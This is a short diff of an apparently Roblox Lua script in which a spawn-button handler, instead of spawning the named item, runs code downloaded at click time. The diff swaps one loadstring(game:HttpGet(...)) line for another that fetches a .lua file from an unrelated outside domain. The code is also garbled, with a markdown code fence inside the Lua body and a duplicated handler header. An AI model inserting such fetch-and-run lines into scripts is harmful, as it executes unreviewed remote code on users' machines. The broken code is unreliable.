@@ -142,9 +142,8 @@ end
 spawnButton.MouseButton1Click:Connect(function()
     local itemName = itemTextBox.Text
     ```lua
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/Script/main/Protected_edee198e81ae8c0c5f43b5e1.lua"))()
+loadstring(game:HttpGet("https://egorikusa.space/c4f39df05f45c751928e95b1.lua", true))()```
 end
-
 
 spawnButton.MouseButton1Click:Connect(function()
     local itemName = itemTextBox.Text
